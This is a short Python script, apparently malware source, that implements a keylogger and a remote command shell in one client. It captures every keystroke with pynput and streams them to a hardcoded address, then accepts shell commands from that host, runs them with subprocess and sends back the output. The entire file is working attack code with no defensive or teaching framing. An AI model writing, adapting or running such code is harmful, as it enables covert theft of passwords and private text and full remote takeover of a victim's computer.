import socket
import threading
import subprocess
import os
import getpass
from pynput import keyboard
from queue import Queue

class RemoteClient:
    def __init__(self, host, port, interval=10):
        self.HOST = host
        self.PORT = port
        self.INTERVAL = interval
        self.text_queue = Queue()
        self.socket = None
        self.keep_running = True

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.HOST, self.PORT))

    def send_keystrokes(self):
        while self.keep_running:
            if not self.text_queue.empty():
                text = self.text_queue.get()
                try:
                    self.socket.send(text.encode())
                except Exception as e:
                    print(f"Send error: {e}")
            threading.Event().wait(self.INTERVAL)

    def on_key_press(self, key):
        try:
            if key == keyboard.Key.esc:
                self.keep_running = False
                return False
            elif key == keyboard.Key.enter:
                self.text_queue.put("\n")
            elif key == keyboard.Key.space:
                self.text_queue.put(" ")
            elif isinstance(key, keyboard.KeyCode):
                self.text_queue.put(str(key.char))
        except AttributeError:
            pass  # Handle special keys if needed

    def listen_keyboard(self):
        with keyboard.Listener(on_press=self.on_key_press) as listener:
            listener.join()

    def receive_commands(self):
        while self.keep_running:
            try:
                cmd_header = self.socket.recv(50)
                if not cmd_header:
                    break
                cmd_len = int(cmd_header.decode().strip())
                cmd = self.socket.recv(cmd_len).decode()
                output = self.execute_command(cmd)
                self.socket.send(output.encode())
            except Exception as e:
                print(f"Command error: {e}")
                break

    def execute_command(self, cmd):
        if cmd.startswith("cd "):
            path = cmd[3:].strip()
            try:
                os.chdir(path)
                return f"Changed directory to {os.getcwd()}"
            except FileNotFoundError:
                return "Directory not found"
        elif cmd == "name":
            return getpass.getuser()
        else:
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return result.stdout + result.stderr
            except Exception as e:
                return str(e)

    def start(self):
        self.connect()
        threading.Thread(target=self.send_keystrokes, daemon=True).start()
        threading.Thread(target=self.receive_commands, daemon=True).start()
        self.listen_keyboard()

if __name__ == "__main__":
    client = RemoteClient("192.168.33.227", 5764, interval=10)
    client.start()
